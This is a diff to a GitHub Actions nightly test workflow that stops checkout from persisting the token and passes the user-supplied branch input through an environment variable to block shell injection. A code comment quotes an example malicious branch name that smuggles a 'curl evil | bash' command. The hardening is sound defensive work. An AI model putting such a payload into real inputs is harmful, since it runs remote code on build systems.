@@ -62,6 +62,8 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
         with:
+          # This job never pushes back to the repo — don't persist the token.
+          persist-credentials: false
           # On manual runs, test the branch the user picked; on the schedule,
           # this input is empty and checkout falls back to the ref the workflow
           # was triggered on (the default branch).
@@ -106,6 +108,8 @@ jobs:
       - name: Checkout repository
         uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
         with:
+          # This job never pushes back to the repo — don't persist the token.
+          persist-credentials: false
           ref: ${{ inputs.branch || github.ref }}
 
       - name: Setup .NET
@@ -166,10 +170,15 @@ jobs:
     if: always()
     steps:
       - name: Report combined result
+        env:
+          # Route the free-form workflow_dispatch input through an env var so it is
+          # treated as data, never re-evaluated by the shell (avoids injection via a
+          # crafted branch name like `x"; curl evil | bash; echo "`).
+          TARGET_REF: ${{ inputs.branch || github.ref }}
         run: |
           echo "## Nightly full test suite" >> "$GITHUB_STEP_SUMMARY"
           echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo "- Target ref: \`${{ inputs.branch || github.ref }}\`" >> "$GITHUB_STEP_SUMMARY"
+          echo "- Target ref: \`$TARGET_REF\`" >> "$GITHUB_STEP_SUMMARY"
           echo "- xUnit (Unit/Security/Performance): ${{ needs.dotnet-tests.result }}" >> "$GITHUB_STEP_SUMMARY"
           echo "- E2E (Docker): ${{ needs.e2e.result }}" >> "$GITHUB_STEP_SUMMARY"
           if [ "${{ needs.dotnet-tests.result }}" != "success" ] || [ "${{ needs.e2e.result }}" != "success" ]; then
